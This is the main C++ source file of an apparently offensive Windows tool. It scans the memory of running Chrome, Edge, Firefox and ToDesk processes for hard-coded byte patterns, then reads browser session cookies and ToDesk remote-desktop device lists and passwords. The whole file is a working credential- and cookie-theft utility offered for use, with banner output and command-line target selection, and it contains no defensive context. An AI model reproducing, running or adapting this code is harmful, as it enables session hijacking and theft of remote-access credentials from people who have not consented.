#include <Windows.h>
#include <shlwapi.h>
#include "Helper.h"
#include "Memory.h"
#include "Application.h"
#include "Process.h"
#pragma comment(lib, "shlwapi.lib")
int main(int argc, char* argv[]) {
    banner();
#ifndef _WIN64
    PRINT("[-] 32bit version is not currently supported.\n");
    return 1;
#endif 
    AppLication targetApp = ToDesk;
    DWORD pid = 0;
    BOOL isBrowser = FALSE;
    BOOL validArg = FALSE;
    BOOL debug = FALSE;
    ToDeskMode mode = Normal;
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "/edge") != NULL) {
            targetApp = Edge;
            isBrowser = TRUE;
            validArg = TRUE;
        }
        else if (StrStrIA(argv[i], "/chrome") != NULL) {
            targetApp = Chrome;
            isBrowser = TRUE;
            validArg = TRUE;
        }
        else if (StrStrIA(argv[i], "/firefox") != NULL) {
            targetApp = FireFox;
            isBrowser = TRUE;
            validArg = TRUE;
        }
        else if (StrStrIA(argv[i], "/todesk") != NULL) {
            targetApp = ToDesk;
            validArg = TRUE;
        }
        else if (StrStrIA(argv[i], "/list") != NULL) {
            mode = List;
        }
        else if (StrStrIA(argv[i], "/pass") != NULL) {
            mode = ListWithPass;
        }
        else if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            usage();
            return 0;
        }
    }
    if (!validArg) {
        usage();
        return 0;
    }

    HANDLE hProcess = NULL;
    BYTE* pattern = NULL;
    LPCWSTR targetProcess = L"\0";
    LPCWSTR targetDll = L"\0";
    size_t szPattern = 0;
    BYTE ChromePattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    BYTE FirefoxPattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0x00, 0xAA, 0x00, 0xAA, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xAA, 0x00, 0xAA, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0xAA, 0x00, 0xAA, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0xAA, 0x00, 0x00, 0xAA, 0x00, 0xAA, 0x00, 0xAA, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00
    };
    BYTE ToDeskPattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    BYTE ToDeskListPattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };
    BYTE ToDeskListPassPattern[] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };
    if (targetApp == Chrome)
    {
        PRINT("[*] Targeting Chrome\n");
        targetProcess = L"chrome.exe";
        targetDll = L"chrome.dll";
        pattern = ChromePattern;
        szPattern = 192;
    }
    else if (targetApp == FireFox) {
        PRINT("[*] Targeting FireFox\n");
        targetProcess = L"firefox.exe";
        targetDll = L"xul.dll";
        pattern = FirefoxPattern;
        szPattern = 88;
    }
    else if (targetApp == Edge) {
        PRINT("[*] Targeting Edge\n");
        targetProcess = L"msedge.exe";
        targetDll = L"msedge.dll";
        pattern = ChromePattern;
        szPattern = 192;
    }
    else if (targetApp == ToDesk) {
        PRINT("[*] Targeting ToDesk\n");
        targetProcess = L"ToDesk.exe";
        targetDll = L"zrtc.dll";
        switch (mode)
        {
        case ListWithPass:
            pattern = ToDeskListPassPattern;
            szPattern = 128;
            break;
        case List:
            pattern = ToDeskListPattern;
            szPattern = 160;
            break;
        case Normal:
        default:
            pattern = ToDeskPattern;
            szPattern = 256;
            break;
        }
    }
    else {
        PRINT("[-] Unknow config\n");
    }

    if (pid == 0)
    {
        if (!FindProcessPID(targetProcess, &pid, &hProcess) || hProcess == NULL)
        {
            PRINT("[-] Failed to find right process!\n");
            return 1;
        }
    }
    BrowserVersion browserVersion = { 0 };
    if (!GetBrowserVersion(hProcess, browserVersion))
    {
        PRINT("[-] Failed to determine Application version!\n");
        return 0;
    }
    uintptr_t browserDlladdress = 0;
    DWORD modulesize = 0;
    if (!GetRemoteModuleBaseAddress(hProcess, targetDll, browserDlladdress, &modulesize))
    {
        PRINT("[-] Failed to find target DLL\n");
        CloseHandle(hProcess);
        return 0;
    }
    PRINTW(L"[+] Found %ls in address: 0x%p\n", targetDll, (void*)browserDlladdress);
    uintptr_t targetSection = 0;
    if (!FindLargestSection(hProcess, browserDlladdress, targetSection)) {
        PRINT("[-] Something went wrong");
        CloseHandle(hProcess);
        return 0;
    }

    PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);

    BYTE browserDllPattern[sizeof(uintptr_t)];
    ConvertToByteArray(targetSection, browserDllPattern, sizeof(uintptr_t));

    if (targetApp == Chrome or targetApp == Edge) {
        PatchPattern(pattern, browserDllPattern, 8);
        PatchPattern(pattern, browserDllPattern, 160);
    }
    else if (targetApp == FireFox)
    {
        PatchPattern(pattern, browserDllPattern, 32);
        PatchPattern(pattern, browserDllPattern, 48);
        PatchPattern(pattern, browserDllPattern, 64);
    }


    uintptr_t* MatchedPatternInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 1000);
    size_t szMatchedPattern = 0;
    if (MatchedPatternInstances == NULL || !FindPattern(hProcess, pattern, szPattern, MatchedPatternInstances, szMatchedPattern, isBrowser))
    {
        PRINT("[-] Failed to find pattern\n");
        CloseHandle(hProcess);
        free(MatchedPatternInstances);
        return 0;
    }
#ifdef DEBUG
    PRINTW(TEXT("[*] Found %Iu instances of Pattern!\n"), szMatchedPattern);
    for (size_t i = 0; i < szMatchedPattern; i++)
        PRINTW(TEXT("[*] Found MatchedPatternInstances on 0x%p\n"), (void*)MatchedPatternInstances[i]);
#endif
    for (size_t i = 0; i < szMatchedPattern; i++)
    {
        uintptr_t PatternOffset = 0x00;
        if (MatchedPatternInstances == NULL || MatchedPatternInstances[i] == NULL)
            break;
        if (targetApp == FireFox) {
            PatternOffset = 0x48;
        }
        if (targetApp == Chrome || targetApp == Edge) {
            PatternOffset = 0x28;
        }
        if (targetApp == ToDesk) {
            PatternOffset = -0x08;
        }
        PatternOffset += MatchedPatternInstances[i] + sizeof(uintptr_t);
#ifdef DEBUG
        PRINTW(TEXT("[*] Pattern should be found in address 0x%p\n"), (void*)PatternOffset);
#endif
        if (isBrowser) {
            WalkCookieMap(hProcess, PatternOffset, targetApp);
        }
        else
        {
            WalkRemoteApp(hProcess, PatternOffset, targetApp, mode);
        }

    }
    CloseHandle(hProcess);
    free(MatchedPatternInstances);

    PRINT("[+] Done\n");
    return 0;
}